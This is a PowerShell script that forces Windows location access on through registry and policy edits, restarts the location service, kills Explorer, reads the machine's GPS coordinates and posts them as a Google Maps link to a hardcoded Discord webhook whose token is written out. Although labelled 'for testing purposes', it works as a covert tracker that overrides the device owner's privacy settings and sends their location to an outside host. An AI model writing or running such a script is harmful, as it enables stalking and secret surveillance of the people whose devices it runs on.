# Overview
# This script enables Windows Location Services, retrieves the device’s approximate geolocation using
# System.Device.Location.GeoCoordinateWatcher, and sends the result to a Discord webhook for testing purposes.

# Process
# 1. Enable Windows location access via registry settings
# 2. Ensure location service (lfsvc) is set to automatic and running
# 3. Apply system policy updates and refresh Explorer
# 4. Wait for location services to initialize
# 5. Request geolocation data (if permission is granted)

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" -Name "LetAppsAccessLocation" -Value 1 -Force

Set-Service -Name "lfsvc" -StartupType Automatic

Start-Sleep -Milliseconds 500

Start-Service -Name "lfsvc"

Stop-Service -Name "lfsvc" -Force -ErrorAction SilentlyContinue
Start-Service -Name "lfsvc"

gpupdate /force

Stop-Process -Name "explorer" -Force


Start-Sleep -Seconds 1


# Geolocation
# Uses Windows built-in location API (GeoCoordinateWatcher)

# Accuracy depends on environment:
# - Urban areas: higher accuracy
# - Rural areas: lower accuracy

#Change the webhook inside the quotation marks to your own webhook
$WebhookUrl = "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT"

Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher

$GeoWatcher.Start()

while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 200
}

if ($GeoWatcher.Permission -eq 'Denied') {
    $PlainTextMessage = "Location access was denied in Windows Privacy Settings."
} else {
    $Latitude  = $GeoWatcher.Position.Location.Latitude
    $Longitude = $GeoWatcher.Position.Location.Longitude

    $PlainTextMessage = "Users Current Location: https://www.google.com/maps?q=$Latitude,$Longitude"
}

# Send to webhook
# The resulting location is formatted as a Google Maps link:

$Body = @{
    content = $PlainTextMessage
} | ConvertTo-Json

Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
